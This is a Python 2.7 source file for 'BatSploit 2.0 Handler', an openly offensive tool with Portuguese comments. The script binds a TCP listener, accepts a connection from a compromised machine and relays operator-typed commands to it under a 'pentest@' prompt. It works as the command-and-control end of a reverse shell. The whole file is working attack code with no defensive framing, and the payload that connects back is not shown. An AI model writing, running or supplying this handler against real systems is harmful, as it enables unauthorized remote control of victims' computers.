#-*-coding: utf8-*-
'''
@Author : Daniel Victor Freire Feitosa
@Version : 2.0
@Name : BatSploit
@Language : Python 2.7

<danielfreire56@hotmail.com>

Tool Open-Source, qualquer mudança pra melhor é bem vinda, os textos estão em inglês pq é mais simples não ter
que acentuar tudo, e também é uma língua universal, mas os comentários estão em pt-br 
'''
import socket, sys, os
try:
	from colorama import init
	from termcolor import colored
	init()
except ImportError:
	sys.stdout.write("[!] Some modules needed to use BatSploit 2\n[*] Run : setup.py\n")
	sys.exit()
os.system("cls") # if windows
#os.system("clear") # if linux or mac
if len(sys.argv) < 3:
	name_script = sys.argv[0].split("\\") # windows only
	#name_script = sys.argv[0].split("/") # linux or mac
	index_name = len(name_script) - 1 
	name = name_script[index_name] # nome do script no windows
	sys.stdout.write(colored("\n ======", "green"))
	sys.stdout.write(colored(" BatSploit 2.0 Handler ", "white"))
	sys.stdout.write(colored("======\n", "green"))
	sys.stdout.write(colored("\n[-]", "green"))
	sys.stdout.write(colored(" Usage : %s <lhost> <lport>\n"%(name), "white"))
	sys.stdout.write(colored("\n @Author : Daniel Victor Freire\n", "grey"))
	sys.stdout.write(colored(" @Version : 2.0.0\n", "grey"))
	sys.stdout.write(colored(" <danielfreire56@hotmail.com>\n", "grey"))
else:
	try:
		bind_host = sys.argv[1] # ip para servir de servidor
		bind_port = int(sys.argv[2]) # porta para escutar
		tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # tcp socket
		try:
			tcp.bind((bind_host, bind_port)) # tcp escutando a porta 8291
			sys.stdout.write(colored("\n[+]", "green"))
			sys.stdout.write(colored(" Listening %s:%i\r\n"%(bind_host, bind_port), "white"))
		except socket.error:
			sys.stdout.write(colored("\n[X]", "red"))
			sys.stdout.write(colored(" This address can't used, try other port or other host\n", "white"))
			sys.exit()
		tcp.listen(1) # espera 1 conexao
		while True:
			tcp_socket, addr = tcp.accept() # aceita a conexao e passa o endereco e o socket
			sys.stdout.write(colored("\n[+]", "green"))
			sys.stdout.write(colored(" Session staged on %s:%i -> %s:%i with (1024 bytes)\n"%(addr[0], addr[1], bind_host, bind_port), "white"))
			while True:
				msg = tcp_socket.recv(4096) # mesagem vinda do host conectado
				print "\n"+msg+"\n"
				cmd = raw_input(colored("pentest@%s:~# "%(addr[0]), "white", attrs=['blink']))# comando atacante
				if cmd == "cls":
					sys.stdout.write(colored("\n[X]", "red"))
					sys.stdout.write(colored(" This command can't execute : %s\n"%(cmd), "white"))
					cmd = "vazio"
				elif cmd == "":
					cmd = "vazio"
				tcp_socket.send(cmd) # envia o comando
			tcp_socket.close()
			sys.stdout.flush()
	except KeyboardInterrupt:
		sys.stdout.write(colored("\n\n[X]", "red"))
		sys.stdout.write(colored(" Exiting ...\n", "white"))
		sys.exit()
